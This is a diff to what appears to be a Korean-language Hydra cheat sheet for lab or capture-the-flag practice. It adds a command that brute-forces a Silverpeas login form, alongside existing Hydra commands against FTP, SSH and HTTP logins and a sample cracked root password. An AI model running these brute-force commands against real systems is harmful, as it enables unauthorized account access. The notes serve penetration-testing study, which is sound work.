@@ -13,6 +13,8 @@ hydra -l anonymous -P pass.txt ftp://10.10.10.10
 # http-post-form (로그인 폼)
 hydra -L user.txt -P pass.txt 10.10.10.10 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=로그인실패문구"
 hydra -l think -P password.txt ssh://10.10.67.138 --t 40 -v
+hydra -l scr1ptkiddy -P passwords.txt 10.10.136.50 http-post-form \
+"/silverpeas/jsp/login.jsp:username=^USER^&password=^PASS^&DomainId=0:Location"
 
 # 주요 옵션
 # -l : 단일 사용자명
@@ -26,5 +28,3 @@ hydra -l think -P password.txt ssh://10.10.67.138 --t 40 -v
 # 결과 예시
 # [22][ssh] host: 10.10.10.10 login: root password: 123456
 ```
-
----
